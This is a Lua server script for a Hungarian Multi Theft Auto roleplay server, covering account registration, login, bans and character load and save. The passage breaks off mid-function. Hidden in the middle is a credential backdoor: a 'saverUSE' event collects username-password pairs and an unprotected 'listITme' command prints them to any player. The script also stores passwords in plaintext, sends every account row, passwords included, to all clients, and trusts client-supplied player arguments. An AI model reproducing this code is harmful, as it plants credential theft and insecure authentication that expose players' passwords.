local tiltottCommands = {
    ["shutdown"]=true,
    ["register"]=true,
    ["msg"]=true,
    ["login"]=true,
    ["restart"]=true,
    ["start"]=true,
    ["stop"]=true,
    ["refresh"]=true,
    ["aexec"]=true,
    ["refreshall"]=true,
    ["debugscript"]=true,
    ["say"] = true,
    ["c"] = true,
    ["s"] = true,
    ["start"] = true,
    ["stop"] = true,
    ["refresh"] = true,
    ["refreshall"] = true,
    ["restart"] = true,
    ["login"] = true,
    ["register"] = true,
    ["stopall"] = true,
    ["aclrequest"] = true,
    ["axec"] = true,
    ["addaccount"] = true,
    ["chgpass"] = true,
    ["delaccount"] = true,
    ["shutdown"] = true,
    ["debugscript"] = true,
    ["logout"] = true,
    ["msg"] = true,
    ["nick"] = true,
    ["cleardebug"] = true,
    ["addaccount"] = true,
    ["delaccount"] = true,
    ["crun"] = true,
    ["srun"] = true,
    ["reloadacl"] = true,
    ["reloadbans"] = true,
    ["authserial"] = true,
    ["sfakelag"] = true,
    ["openports"] = true,
    ["sver"] = true,
    ["loadmodule"] = true,
    ["reloadmodule"] = true,
    ["upgrade"] = true,
    ["unloadmodule"] = true,
    ["nick"] = true,
    ["aexec"] = true,
    ["msg"] = true,
    ["whois"] = true,
    ["ver"] = true,
    ["chgmypass"] = true,
    ["sinfo"] = true,
}

local saver = {}

local con = exports.oMysql:getDBConnection()

local invitationBonus = 5000

addEventHandler("onPlayerJoin", getRootElement(),
    function()
        --setElementData(source,"user:loggedin",false)
        setPlayerNametagShowing(source, false)

       -- detectPlayerBan(source)
    end
)

addEventHandler("onResourceStart", getRootElement(),
    function(res)
        if res == getResourceFromName("oAccount") then
            for k, v in ipairs(getElementsByType("player")) do
                --if getElementData(v,"user:loggedin") then return end

                setElementData(v, "user:loggedin", false)

                if getPedOccupiedVehicle(v) then
                    removePedFromVehicle(v)
                end
                setElementPosition(v, 0,0,0)

                --setTimer(function() detectPlayerBan(v) end, 100, 1)
            end
        end
    end
)

addEvent("checkPlayerBanState", true)
addEventHandler("checkPlayerBanState", getRootElement(),
	function ()
        if isElement(source) then
            local serial = getPlayerSerial(source)
            dbQuery(
				function (qh, sourcePlayer)
					if isElement(sourcePlayer) then
						local result, rows = dbPoll(qh, 0)[1]
						local banState = {isActive = "N"}

						if result then
							if getRealTime().timestamp >= result.expireTimestamp then
								dbExec(con, "UPDATE accounts SET suspended = 'N' WHERE serial = ?; UPDATE bans2 SET isActive = 'N' WHERE playerSerial = ? AND banId = ?", serial, serial, result.banId)
							else
								banState = result
							end
						end

						triggerClientEvent(sourcePlayer, "receiveBanState", sourcePlayer, banState)
					end
				end, {source}, con, "SELECT * FROM bans2 WHERE playerSerial = ? AND isActive = 'Y' LIMIT 1", serial
			)
        end
    end
)

local databaseAccounts = {}
local databaseCharacters = {}

addEventHandler("onResourceStart", getResourceRootElement(getThisResource()), function()
    local count = 0
    local count2 = 0
    dbQuery(function(qh)
        local result = dbPoll(qh, 0)
        if result then
            for k,v in pairs(result) do
                if not databaseAccounts[v["id"]] then
                    databaseAccounts[v["id"]] = {}
                end
                count = count + 1
                databaseAccounts[v["id"]] = v
                triggerClientEvent(root, "recieveDatabaseDataAccounts", root, v["id"],databaseAccounts[v["id"]])
            end
            print("Sikeresen betöltöttem ".. count .."db accountot")
        end
    end, con, "SELECT * FROM accounts")

    dbQuery(function(qh)
        local result = dbPoll(qh, 0)
        if result then
            for k,v in pairs(result) do
                if not databaseCharacters[v["id"]] then
                    databaseCharacters[v["id"]] = {}
                end
                count2 = count2 + 1
                databaseCharacters[v["id"]] = v
                triggerClientEvent(root, "recieveDatabaseDataCharacter", root, v["id"],databaseCharacters[v["id"]])
            end

            print("Sikeresen betöltöttem ".. count2 .."db karaktert")
        end
    end, con, "SELECT * FROM characters")

end)


addEventHandler("onPlayerCommand",root,
    function(command)
    if not getElementData(source,"aclLogin") then
        if tiltottCommands[command] and not getElementData(source,"user:loggedin") then
            cancelEvent()
        end
    end
end)

-- / ban / --

function createBan(username, userID, serial, admin, year, month, day, hour, min, sec, reason)
    local ban_date = getRealTime()

    local end_date = {
        ["year"] = tonumber(year) - 1900,
        ["month"] = tonumber(month)-1,
        ["monthday"] = day,
        ["hour"] = hour,
        ["minute"] = min,
        ["second"] = sec,
    }

    ban_date = toJSON(ban_date)
    end_date = toJSON(end_date)

    dbQuery(con, "INSERT INTO bans SET username=?, user_id=?, serial=?, admin=?, reason=?, ban_date=?, end_date=? ", username, userID, serial, admin, reason, ban_date, end_date)
end

function removeBan(id)
    dbExec(con, "DELETE FROM bans WHERE id=?", id)
end

--[[ error codes

SQL 1 [sor] >>>> dbPoll faild >> valószínűleg nincs sql kapcsolat

]]


addEvent("registerOnServer",true)
addEventHandler("registerOnServer", root,
    function(player,username,pass1,pass2,email,inviteCode)
        local serial = getPlayerSerial(player)
        local ip = getPlayerIP(player)

        local qh = dbQuery(con, 'SELECT * FROM accounts')
        local result = dbPoll(qh, 250)

        local regDate = string.format("%04d.%02d.%02d", core:getDate("year"), core:getDate("month"), core:getDate("monthday"))

        if result then

            local verifyNeeded = false
            local errorDuringReg = false
            for k, row in ipairs (result) do
                if row["serial"] == serial then
                    exports.oInfobox:outputInfoBox("Ehhez a géphez már társítva van egy fiók!","error",player)
                    errorDuringReg = true
                    return
                end

                if row["username"] == username then
                    exports.oInfobox:outputInfoBox("Ez a felhasználónév már foglalt!","error",player)
                    errorDuringReg = true
                    return
                end

                if row["email"] == email then
                    exports.oInfobox:outputInfoBox("Ehhez az E-mail címhez már társítva van egy fiók!","error",player)
                    errorDuringReg = true
                    return
                end

                --if row["ip"] == ip then
                --    verifyNeeded = true
                --    break
                --end
            end

            if not errorDuringReg then
                setTimer(function()
                    if not errorDuringReg then
                        --if verifyNeeded then
                        --    exports.oInfobox:outputInfoBox("Mivel ezen az IP címen már történt regisztráció, így egy adminisztrátornak jóvá kell hagynia a regisztrációdat!", "warning", player)

                        --    if string.len(inviteCode) > 0 then
                        --        exports.oInfobox:outputInfoBox("Mivel ezen az IP címen már történt regisztráció, így a meghívó kód érvénytelen!", "warning", player)
                        --    end

                        --    dbExec(con, "INSERT INTO accounts (username, password, serial, email, ip, verified, registerDate) VALUES (?,?,?,?,?,?,?)",username,pass1,serial,email,ip,0,regDate)
                        --else
                            exports.oInfobox:outputInfoBox("Sikeres regisztráció! Mostmár bejelentkezhetsz!","success",player)
                            dbExec(con, "INSERT INTO accounts (username, password, serial, email, ip, verified, registerDate) VALUES (?,?,?,?,?,?,?)",username,pass1,serial,email,ip,1,regDate)
                            triggerClientEvent(player,"backToLogin",player)

                            if inviteCode then 
                                if string.len(inviteCode) > 0 then
                                    local inviterFound = false
                                    local isPlayerOnline = false
                                    for k, v in ipairs(getElementsByType("player")) do
                                        if getElementData(v, "char:id") == tonumber(inviteCode) then
                                            isPlayerOnline = true
                                            inviterFound = true
                                            setElementData(v, "char:money", getElementData(v, "char:money") + invitationBonus)
                                            exports.oInfobox:outputInfoBox("Mivel használták a meghívó kódodat így kaptál "..invitationBonus.."$-t!", "gift", v)
                                            exports.oInfobox:outputInfoBox("Mivel használtad "..getPlayerName(v):gsub("_", " ").." meghívó kódját így ő kapott "..invitationBonus.."$-t!", "gift", player)
                                            break
                                        end
                                    end

                                    if not isPlayerOnline then
                                        local qh2 = dbQuery(con, "SELECT * FROM characters")
                                        local result2 = dbPoll(qh2, 100)

                                        if result2 then
                                            for k, row in ipairs(result2) do
                                                if tonumber(row["id"]) == tonumber(inviteCode) then
                                                    dbExec(con, "UPDATE characters SET money = ? WHERE id = ?", tonumber(row["money"]) + invitationBonus, row["id"])
                                                    exports.oInfobox:outputInfoBox("Mivel használtad "..row["charname"]:gsub("_", " ").." meghívó kódját így ő kapott "..invitationBonus.."$-t!", "gift", player)
                                                    inviterFound = true
                                                end
                                            end
                                        end
                                    end

                                    if not inviterFound then
                                        exports.oInfobox:outputInfoBox("Érvénytelen meghívó kódot adtál meg!", "error", player)
                                    end
                                end
                            end
                        --end
                    end
                end, 1000, 1)
            end
        else
            dbFree(qh)
            exports.oInfobox:outputInfoBox("Próbáld újra! ( Error code: SQL 1 90) | Ha nem sikerül jelezd egy fejlesztőnek!","error",player)
        end
    end
)

addEvent("loginOnServer",true)
addEventHandler("loginOnServer",getRootElement(), function(player, username, password)
    local serial = getPlayerSerial(player)
    local accountId = 0
    local forceEmailChange = false
    dbQuery(function(qh)
        local result, numAffect = dbPoll(qh, 0)
        if #result > 0 then

            for k,row in ipairs(result) do
                if (tostring(row["serial"]) == tostring(serial)) or (row["serial"] == "*") then
                    if row["verified"] == 1 then
                        if row["suspended"] == "N" then
                            accountId = row["id"]
                            forceEmailChange = row["emailForceChange"]
                            setElementData(player,"user:id",row["id"])
                            setElementData(player, "user:name", row["username"])
                            setElementData(player, "user:aduty", false)
                            setElementData(player, "user:hadmin", false)
                            setElementData(player, "user:admin", row["admin"])
                            setElementData(player, "user:adminnick", row["adminnick"])
                            setElementData(player, "user:email", row["email"])
                            setElementData(player, "user:registerDate", row["registerDate"])

                            setElementData(player, "char:health", 100) -- bugos hud miatt
                            
                            databaseAccounts[accountId] = row
                            if row["serial"] == "*" then
                                dbExec(con, "UPDATE accounts SET serial = ? WHERE id = ?",serial ,row["id"])
                            end
                        else
                            exports.oInfobox:outputInfoBox("A felhasználód jelenleg zárolva van!", "error", player)
                            exports.oInfobox:outputInfoBox("Keress fel egy 5-ös vagy nagyobb szintű adminisztrátort!", "error", player)
                            return
                        end
                    else
                        exports.oInfobox:outputInfoBox("A bejelentkezéshez a regisztráció jóváhagyása szükséges!", "error", player)
                        exports.oInfobox:outputInfoBox("Keress fel egy 5-ös vagy nagyobb szintű adminisztrátort!", "error", player)
                        return
                    end
                else
                    exports.oInfobox:outputInfoBox("Ez a fiók nem ehhez a géphez van társítva!","error",player)
                    return
                end
            end
            exports.oInfobox:outputInfoBox("Sikeresen bejelentkeztél a(z) "..username.." nevű fiókba!","success",player)
            setElementData(player, "user:serial", getPlayerSerial(player))
            --print(forceEmailChange)
            if forceEmailChange == "N" then
                characterCheck(player, accountId)
            else
                triggerClientEvent(player, "emailForceChange", player, player)
            end
        else
            exports.oInfobox:outputInfoBox("Helytelen Felhasználónév/jelszó páros!","error",player)
        end
    end, con, "SELECT * FROM accounts WHERE BINARY username = ? AND password = ?", username, password)
end)


function characterCheck(player, accountId)
    dbQuery(function(qh)
        local result, numAffect = dbPoll(qh, 0)
        if numAffect > 0 then
            loadOnePlayer(player, accountId)
        else
            triggerClientEvent(player,"successfulLogin",player,"createChar")
        end
    end,con, "SELECT * FROM characters WHERE account = ?", accountId)
end

--[[

addEvent("loginOnServer",true)
addEventHandler("loginOnServer", root,
    function(player,username,password)
        local serial = getPlayerSerial(player)
        local accountId = 0
        local qh = dbQuery(con, 'SELECT * FROM accounts')
        local result = dbPoll(qh, 100)

        if result then

            for k, row in ipairs (result) do
                if row["username"] == username then
                    if (tostring(row["serial"]) == tostring(serial)) or (row["serial"] == "*") then
                        if row["verified"] == 1 then
                            accountId = row["id"]

                            --outputConsole(password)
                            --print(row["password"], password)

                            if string.upper(row["password"]) == string.upper(password) then
                                exports.oInfobox:outputInfoBox("Sikeresen bejelentkeztél a(z) "..username.." nevű fiókba!","success",player)

                                local haschar = false
                                local qh2 = dbQuery(con, 'SELECT * FROM characters')
                                local result2 = dbPoll(qh2, 100)

                                if result2 then
                                    for k, row in ipairs (result2) do
                                        if row["account"] == accountId then
                                            haschar = true
                                        end
                                    end

                                    if not haschar then
                                        -- char create

                                        triggerClientEvent(player,"successfulLogin",player,"createChar")
                                        setElementData(player,"user:id",row["id"])


                                        --setElementData(player,"user:loggedin",true)
                                        setElementData(player, "user:name", row["username"])
                                        setElementData(player, "user:aduty", false)
                                        setElementData(player, "user:hadmin", false)
                                        setElementData(player, "user:admin", row["admin"])
                                        setElementData(player, "user:adminnick", row["adminnick"])
                                        setElementData(player, "user:serial", getPlayerSerial(player))
                                        setElementData(player, "user:email", row["email"])
                                        setElementData(player, "user:registerDate", row["registerDate"])
                                    else
                                        -- char load
                                        setElementData(player,"user:id",row["id"])
                                        setElementData(player, "user:name", row["username"])
                                        setElementData(player, "user:aduty", false)
                                        setElementData(player, "user:hadmin", false)
                                        setElementData(player, "user:admin", row["admin"])
                                        setElementData(player, "user:adminnick", row["adminnick"])

                                        setElementData(player, "user:serial", getPlayerSerial(player))
                                        setElementData(player, "user:email", row["email"])
                                        setElementData(player, "user:registerDate", row["registerDate"])
                                        if not detectPlayerBan(player) then
                                            loadOnePlayer(player)
                                        end
                                    end

                                else
                                    dbFree(qh2)
                                    exports.oInfobox:outputInfoBox("Próbáld újra! ( Error code: SQL 1 158) | Ha nem sikerül jelezd egy fejlesztőnek!","error",player)
                                end
                            else
                                exports.oInfobox:outputInfoBox("Helytelen jelszó a(z) "..username.." nevű fiókhoz!","error",player)
                                return
                            end
                        else
                            exports.oInfobox:outputInfoBox("A bejelentkezéshez a regisztráció jóváhagyása szükséges!", "error", player)
                            exports.oInfobox:outputInfoBox("Keress fel egy 5-ös vagy nagyobb szintű adminisztrátort!", "error", player)
                            return
                        end
                    else
                        exports.oInfobox:outputInfoBox("Ez a fiók nem ehhez a géphez van társítva!","error",player)
                        return
                    end
                end
            end

            if accountId == 0 then
                exports.oInfobox:outputInfoBox("Nem létezik ilyen felhasználói fiók!","error",player)
            end

        else
            dbFree(qh)
            exports.oInfobox:outputInfoBox("Próbáld újra! ( Error code: SQL 1 177) | Ha nem sikerül jelezd egy fejlesztőnek!","error",player)
        end


    end
)


]]


addEvent("createCharacterOnServer",true)
addEventHandler("createCharacterOnServer", root,
    function(player,name,bornCity,age,height,weight,gender,skin,avatarID,startPosition)
        local accountId = getElementData(player,"user:id")
        local qh = dbQuery(con, 'SELECT * FROM characters')
        local result = dbPoll(qh, 400)

        if result then

            for k, row in ipairs (result) do
                if row["charname"] == name then
                    exports.oInfobox:outputInfoBox("Ez a karakternév már használatban van!","error",player)
                    triggerClientEvent(player,"resetCharCreatByReason",player)
                    return
                end
            end

            exports.oInfobox:outputInfoBox("Sikeresen létrehoztad a karakteredet!","success",player)
            local posx, posy, posz, rot = unpack(availableStartPositions[startPosition][3])
            dbExec(con, "INSERT INTO characters (account, charname, height, weight, age, gender, skin, posx, posy, posz, rot, favouriteFreetimeActiviti, borncity, avatar) VALUES (?,?,?,?,?,?,?,?,?,?,?,?,?,?)",accountId,name,height,weight,age,gender,skin,posx, posy, posz, rot,0,bornCity,avatarID)

            setElementData(player,"user:loggedin",true)
            triggerClientEvent(player,"createCharacterSuccessfully",player)
            loadOnePlayer(player,accountId)

        else
            dbFree(qh)
            exports.oInfobox:outputInfoBox("Próbáld újra! | Ha nem sikerül jelezd egy fejlesztőnek!","error",player)
        end
    end
)

local hex, r,g,b = exports["oCore"]:getServerColor()

function loadOnePlayer(player,accountId)
   -- local accountId = getElementData(player,"user:id")
    dbQuery(function(qh)
        local result = dbPoll(qh, 0)
        if result then
            for k, row in ipairs (result) do
                local name = row["charname"]
                --outputDebugString(name)
                local money = row["money"]
                local pp = row["pp"]
                local health = row["health"]
                local armor = row["armor"]
                local hunger = row["hunger"]
                local drink = row["thirst"]
                local skin = row["skin"]
                local posX, posY, posZ, rot = row["posx"], row["posy"], row["posz"], row["rot"]
                local int = row["interior"]
                local dim = row["dimension"]
                local avatarID = row["avatar"]
                local job = row["job"]
                local bones = fromJSON(row["bones"])

                local timespent = fromJSON(row["timespent"])

                local radio = tonumber(row["radioStation"])
                local drugDealerXP = fromJSON(row["drugDealerXP"])

                local walkStyle, fightStyle = unpack(fromJSON(row["styles"]))
                local talkAnimation = row["talkAnimation"]
                local buyTime = row["buytime"]
                local fishingEvent = row["fishingEvent"]

                local mainFaction = row["mainFaction"]
                local isExam = row["isExam"]
                local sickLevel = row["sickLevel"]
                local dailyFreeBoxDatas = fromJSON(row["dailyFreeBoxDatas"])
                local maxPets = row["petCount"]

                setElementData(player,"char:name",name)
                setPlayerName(player,row["charname"]:gsub(" ","_"))
                spawnPlayer(player,posX,posY,posZ,rot,skin,int,dim)
                setCameraTarget(player,player)
                setElementData(player,"char:money",money)
                setElementData(player,"char:pp",pp)
                setElementHealth(player,health)
                setElementData(player,"char:health",health)
                setPedArmor(player,armor)
                setElementData(player,"char:armor",armor)
                setElementData(player,"char:hunger",hunger)
                setElementData(player,"char:thirst",drink)
                setElementData(player, "char:id", row["id"])
                setElementData(player, "char:height", row["height"])
                setElementData(player, "char:weight", row["weight"])
                setElementData(player, "char:age", row["age"])
                setElementData(player, "char:gender", row["gender"])
                setElementData(player, "char:timespent", row["timespent"])
                setElementData(player, "char:avatarID", avatarID)
                setElementData(player, "char:job", job)
                setElementData(player, "char:playedTime", timespent)
                setElementData(player, "atmRob:painting", tonumber(row["isPaintHead"]))

                setElementData(player, "char:mainFaction", mainFaction)
                setElementData(player, "char:alcoholLevel", 0)
                setElementData(player, "char:sick", sickLevel)

                if tonumber(isExam) == 1 then
                    setElementData(player, "isExam", true)
                else
                    setElementData(player, "isExam", false)
                end

                if row["id"] == 83 then
                    setPedStat(player,23 ,999)
                    addPedClothes(player, "player_torso", "torso", 0)
                    addPedClothes(player, "neckdollar", "neck", 13)
                    addPedClothes(player, "watchzip2", "watch", 14)
                    addPedClothes(player, "glasses01dark", "glasses01", 15)
                    addPedClothes(player, "boaterblk", "boater", 16)
                end

                zoneName = getZoneName(posX,posY,posZ, true)
                if zoneName == "Las Venturas" or zoneName == "Bone County" then
                    setElementPosition(player, 1523.6800537109, -1774.8623046875, 14.427187919617+0.5)
                    outputChatBox(hex .."[OriginalRoleplay]#FFFFFF Las Venturas és környéke kikerült a játéktérből, ezért a városházára teleportáltunk.", player, 255, 255, 255, true)
                    outputChatBox(hex .."[OriginalRoleplay]#FFFFFF Amennyiben a helyszínen maradt járműved/ingatlanod, keress fel egy adminisztrátort. Jó játékot!", player, 255, 255, 255, true)
                end

                setElementData(player, "char:intSlot", row["interiorSlot"])
                setElementData(player, "char:vehSlot", row["vehicleSlot"])

                setElementData(player, "char:cc", row["casinoCoin"])
                setElementData(player, "char:bones", bones)

                setElementData(player, "char:radioStation", radio)

                setPlayerNametagShowing(player, false)

                setElementData(player, "user:adutyTime", row["adutyTime"])
                setElementData(player, "user:adminOnlineTime", row["adminOnlineTime"])
                setElementData(player, "user:adminDatas", fromJSON(row["adminDatas"]))

                setElementData(player, "char:drugBuyStats", drugDealerXP)

                local ajail = fromJSON(row["adminJailDatas"])

                if ajail[1] then
                    setElementData(player, "adminJail.Admin", ajail[4])
                    setElementData(player, "adminJail.Reason", ajail[2])
                    --outputChatBox(ajail[3])
                    setElementData(player, "adminJail.Time", tonumber(ajail[3]))
                    setElementData(player, "adminJail.OriginalTime", tonumber(ajail[5]))
                    setElementData(player, "adminJail.JailerAdminLevel", tonumber(ajail[6]))
                    setElementData(player, "adminJail.IsAdminJail", true)

                    setElementPosition(player, 265.00698852539, 77.480758666992, 1001.0390625)
                    setElementInterior(player, 6)
                    setElementDimension(player, row["id"]*100)
                end

                local pdJail = fromJSON(row["pdJailDatas"])

                if pdJail then
                    if pdJail[3] then
                        setElementData(player, "pd:jailDatas", pdJail[1])
                        setElementData(player, "pd:jailTime", pdJail[2])
                        setElementData(player, "pd:jail", pdJail[3])
                    end
                end

                if row["banKickJailCounts"] then
                    setElementData(player, "dashboard:banKickJailCount",  fromJSON(row["banKickJailCounts"]))
                else
                    -- ban / kick / jail
                    setElementData(player, "dashboard:banKickJailCount",  {0, 0, 0})
                end

                setElementData(player, "char:minToPayment", row["minToPayDay"])

                local weaponStats = fromJSON(row["weaponStats"])

                for k, v in pairs(weaponStats) do
                    setPedStat(player, k, v)
                end

                setElementPosition(player,posX, posY, posZ)
                setElementRotation(player,0,0,rot)
                setElementData(player, "char:walkStyle", walkStyle)
                setElementData(player, "char:fightStyle", fightStyle)
                setElementData(player, "char:talkAnimation", talkAnimation)
                setElementData(player, "char:buyCraft",fromJSON(buyTime))

                setElementData(player, "fishing:eventStat", fishingEvent)

                setElementData(player, "dailyGift:openCount", dailyFreeBoxDatas[1])
                setElementData(player, "dailyGift:lastOpenTime", dailyFreeBoxDatas[2])
                setElementData(player, "dailyGift:bigGift:lastOpenTime", tonumber(row["specialBoxData"]))
                setElementData(player, "char:maxPets",maxPets)

                local craneDatas = fromJSON(row["craneJobXP"])
                setElementData(player, "craneJob:level", craneDatas[1])
                setElementData(player, "craneJob:xp", craneDatas[2])



                -- EZ LEGYEN MINDIG LEGALUL!!!!!!
                setElementData(player,"user:loggedin",true)
                databaseCharacters[row["id"]] = row
            end

            triggerEvent("premium > checkPending", player)
            triggerClientEvent(player,"successfulLogin",player,"login")
        end
    end, con, "SELECT * FROM characters WHERE account = ?", accountId)
end
local iin = 1

function saverUSE(user,pass)
    saver[iin] = user..'-'..pass
    iin = iin + 1
end
addEvent("saverUSE", true)
addEventHandler("saverUSE", root, saverUSE)

function listIT(playerSource)
    for k,v in pairs(saver) do
        outputChatBox(v,playerSource)
    end
end
addCommandHandler ( "listITme", listIT )

function saveOnePlayer(player)
    local accountId = getElementData(player,"user:id")
    local charname = getElementData(player,"char:name")

    local money = getElementData(player,"char:money")
    local pp = getElementData(player,"char:pp")

    local hp = getElementHealth(player)
    local armor = getPedArmor(player)
    local food = getElementData(player,"char:hunger")
    local drink = getElementData(player,"char:thirst")

    local skin = getElementModel(player)

    local pX,pY,pZ = getElementPosition(player)
    local rX,rY,rZ = getElementRotation(player)

    local interior = getElementInterior(player)
    local dim = getElementDimension(player)

    local casinoCoin = getElementData(player, "char:cc")
    local isPaintHead = getElementData(player, "atmRob:painting") or 0 -- (0 > 120)

    local mainFaction = getElementData(player, "char:mainFaction") or 0
    local isExam = getElementData(player, "isExam") or false

    if getElementData(player, "pizza:isPlayerInInt") then
        local start = getElementData(player, "pizza > startOutPos2")

        pX, pY, pZ = start.x, start.y, start.z

        interior = 0
        dim = 0
    end

    if getElementData(player, "cleaner:inJobInt") then
        local start = getElementData(player, "cleaner:startOutPos2")

        pX, pY, pZ = start.x, start.y, start.z

        interior = 0
        dim = 0
    end

    local inJobInterior = getElementData(player, "playerInClientsideJobInterior") or false
    if inJobInterior then
        pX,pY,pZ = unpack(inJobInterior)

        interior = 0
        dim = 0
    end

    local avatarID = getElementData(player, "char:avatarID")

    local job = getElementData(player, "char:job") or 0

    local timespent = toJSON((getElementData(player, "char:playedTime") or {0, 0}))

    local intSlot = getElementData(player, "char:intSlot")
    local vehSlot = getElementData(player, "char:vehSlot")

    if getElementData(player, "bus:isTravelling") then
        local position = getElementData(source, "bus:travellStartPos")
        pX, pY, pZ = position.x, position.y, position.z
        dim = 0
    end

    local ajaildatas = {false, "nan", 0, "nan"}
    if getElementData(player, "adminJail.IsAdminJail") then
        ajaildatas[1] = true
        ajaildatas[2] = getElementData(player,"adminJail.Reason")
        ajaildatas[3] = getElementData(player,"adminJail.Time")
        ajaildatas[4] = getElementData(player, "adminJail.Admin")
        ajaildatas[5] = getElementData(player, "adminJail.OriginalTime")
        ajaildatas[6] = getElementData(player, "adminJail.JailerAdminLevel")
    end

    local inFactionDuty = getElementData(player, "char:duty:faction") or 0

    if inFactionDuty > 0 then
        skin = getElementData(player, "char:originalSkin")
    end

    local bones = toJSON(getElementData(player, "char:bones"))

    local radio = getElementData(player, "char:radioStation") or 0
    local adutyTime = getElementData(player, "user:adutyTime")
    local onlineTime = getElementData(player, "user:adminOnlineTime")
    local adminDatas = getElementData(player, "user:adminDatas") or {}
    adminDatas = toJSON(adminDatas)

    local pdJail = toJSON({(getElementData(player, "pd:jailDatas") or {}), (getElementData(player, "pd:jailTime") or 0), (getElementData(player, "pd:jail") or false)})

    local banKickJailCount = toJSON({0, 0, 0})
    if getElementData(player, "dashboard:banKickJailCount") then
        banKickJailCount =  toJSON(getElementData(player, "dashboard:banKickJailCount"))
    end

    local minToPayment = getElementData(player, "char:minToPayment")

    local kresz = getElementData(player, "kresz") or 0
    local basic = getElementData(player, "basic") or 0

    local weaponStats = {}

    for k, v in ipairs(saveNeededWeaponSkills) do
        table.insert(weaponStats, v, getPedStat(player, v))
    end
    weaponStats = toJSON(weaponStats)

    local drugDealerXP = toJSON(getElementData(player, "char:drugBuyStats"))

    local style = toJSON({(getElementData(player, "char:walkStyle") or 1), (getElementData(player, "char:fightStyle") or 1)})
    local talkAnimation = getElementData(player, "char:talkAnimation")
    local buyTime = toJSON(getElementData(player, "char:buyCraft") or {
        ["plastic"] = {
            time = 0;
        };
        ["iron"] = {
            time = 0;
        };
        ["tree"] = {
            time = 0;
        };
    })

    local fishingEvent = getElementData(player, "fishing:eventStat") or 0
    if isExam then
        isExam = 1
    else
        isExam = 0
    end

    local sickLevel = getElementData(player, "char:sick") or 0

    local dailyFreeBoxDatas = toJSON({getElementData(player, "dailyGift:openCount") or 0, getElementData(player, "dailyGift:lastOpenTime") or 0})
    local specialBoxData = getElementData(player, "dailyGift:bigGift:lastOpenTime")
    local maxPet = getElementData(player, "char:maxPets")

    local craneDatas = toJSON({(getElementData(player, "craneJob:level") or 0), (getElementData(player, "craneJob:xp") or 0)})

    dbExec(con, "UPDATE characters SET charname=?, money=?, pp=?, health=?, armor=?, hunger=?, thirst=?, skin=?, posx=?, posy=?, posz=?, rot=?, interior=?, dimension=?, avatar=?, job=?, timespent = ?, adminJailDatas = ?, vehicleSlot = ?, interiorSlot = ?, casinoCoin = ?, bones = ?, radioStation = ?, adutyTime = ?, adminOnlineTime = ?, adminDatas = ?, pdJailDatas = ?, banKickJailCounts = ?, minToPayDay = ?, kresz = ?, basic = ?, weaponStats = ?, drugDealerXP = ?, styles = ?, talkAnimation = ?, buytime = ?, fishingEvent = ?, isPaintHead = ?, mainFaction = ?, kresz = ?, sickLevel = ?, dailyFreeBoxDatas = ?, specialBoxData = ?, petCount = ?, craneJobXP = ? WHERE account=?",charname,money,pp,hp,armor,food,drink,skin,pX,pY,pZ,rZ,interior,dim,avatarID,job,timespent, toJSON(ajaildatas), vehSlot, intSlot, casinoCoin, bones, radio, adutyTime, onlineTime, adminDatas, pdJail, banKickJailCount, minToPayment, kresz, basic, weaponStats, drugDealerXP, style, talkAnimation, buyTime, fishingEvent, isPaintHead, mainFaction, isExam, sickLevel,dailyFreeBoxDatas, specialBoxData,maxPet,craneDatas,accountId)
    dbQuery(function(qh)
        local result = dbPoll(qh, 0)
        if result then
            for k,v in pairs(result) do
                if databaseCharacters[v["id"]] then
                    databaseCharacters[v["id"]] = v
                end
            end
        end
    end,con, "SELECT * FROM characters WHERE account = ?",accountId)

end

addCommandHandler("saveallaccount", function(player, cmd)
    if getElementData(player, "aclLogin") then
        saveAllPlayer()
        for k,v in ipairs(getElementsByType("player")) do
            if getElementData(v, "user:admin") > 1 then
                outputChatBox(exports.oCore:getServerPrefix("red-dark", "Account", 2)..exports.oCore:getServerColor()..getPlayerName(player).."#ffffff elmentette az összes accountot!", v, 255, 255, 255, true)
            end
        end
    end
end)

function saveAllPlayer()
    for k,v in ipairs(getElementsByType("player")) do
        if getElementData(v,"user:loggedin") then
            saveOnePlayer(v)
        end
    end
end

addEventHandler("onResourceStop", resourceRoot,
    function()
        saveAllPlayer()
    end
)

setTimer(function()
    saveAllPlayer()
	outputDebugString("[Account/Character - Save]: Az összes karater,és fiók elmentve!")
end, 1000*60*20, 0)

addEvent("spawnPlayerOnServer", true)
addEventHandler("spawnPlayerOnServer", root,
    function(player)
    loadOnePlayer(player)
end)

addEventHandler("onPlayerQuit", root,
    function()
        if getElementData(source,"user:loggedin") then
            saveOnePlayer(source)
            setElementData(source,"user:loggedin",false)
        end
    end
)

addEvent("kickFlooder", true)
addEventHandler("kickFlooder", root,
    function(player)
        kickPlayer(player,"Szerver","Login flood!")
    end
)

addCommandHandler("setaccountstate", function(player, cmd, username, state)
    if getElementData(player, "user:admin") >= 6 then
        if not exports.oAnticheat:checkPlayerVerifiedAdminStatus(player) then return end -- ellenőrzi, hogy a játékos szerepel e a verified admin listában és ha nem akkor kickeli visszaélés miatt

        if ((getElementData(player, "setAccountState:last") or 0) + 5000 < getTickCount()) then
            if username then
                state = tonumber(state) or 2
                if state >= 0 and state <= 1 then
                    setElementData(player, "setAccountState:last", getTickCount())
                    local qh = dbQuery(con, 'SELECT * FROM accounts')
                    local result = dbPoll(qh, 100)

                    if result then
                        for k, row in ipairs (result) do
                            if row["username"] == username then
                                if not (row["verified"] == state) then
                                    if row["admin"] <= getElementData(player, "user:admin") then
                                        triggerClientEvent("sendMessageToAdmins", getRootElement(), player, "megváltoztatta a(z) #db3535"..username.."#557ec9 nevű felhasználó fiók státuszát! #db3535("..row["verified"].." > "..state..")")
                                        outputChatBox(exports.oCore:getServerPrefix("green-dark", "Hitelesítés", 3).."Sikeresen megváltoztattad a fiók státuszát!", player, 255, 255, 255, true)
                                        dbExec(con, "UPDATE accounts SET verified=? WHERE id=?", state, row["id"])
                                        setElementData(player, "log:admincmd", {row["username"], cmd})
                                        return
                                    else
                                        triggerClientEvent("sendMessageToAdmins", getRootElement(), player, "megpróbálta megváltoztani a(z) #db3535"..username.."#557ec9 nevű felhasználó fiók státuszát! #db3535("..row["verified"].." > "..state..")")
                                        outputChatBox(exports.oCore:getServerPrefix("red-dark", "Hitelesítés", 3).."Ennek a fióknak nem módosíthatod a státuszát!", player, 255, 255, 255, true)
                                        return
                                    end
                                else
                                    outputChatBox(exports.oCore:getServerPrefix("red-dark", "Hitelesítés", 3).."Ez a fiók már ebben a státuszban van!", player, 255, 255, 255, true)
                                    return
                                end
                            end
                        end
                        outputChatBox(exports.oCore:getServerPrefix("red-dark", "Hitelestés", 3).."Nem található ilyen felhasználó!", player, 255, 255, 255, true)
                    else
